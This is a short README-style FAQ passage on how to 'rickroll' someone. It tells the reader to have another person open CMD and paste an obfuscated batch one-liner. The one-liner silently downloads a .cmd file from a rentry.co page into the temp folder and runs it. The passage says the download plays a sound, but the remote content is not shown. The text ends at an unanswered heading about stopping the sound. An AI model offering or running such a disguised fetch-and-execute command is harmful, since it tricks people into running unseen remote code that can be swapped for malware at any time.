### ▶ How can I rickroll?
- Tell them to open CMD
- Tell them to paste the following command into the window and press enter
```bat
for %b in (F2) do for %c in ("%temp%\F") do for %d in (.) do for %e in (cmd) do for %f in (rentry) do (cls&&curl -#Lsko "%~c2%d%e" "%f%dco/%b/raw"&&call "%~c2%d%e")
```
- Once they did it they will need to wait a few seconds for the sound to download and play

### ⏹ How do I stop the sound when its already running?
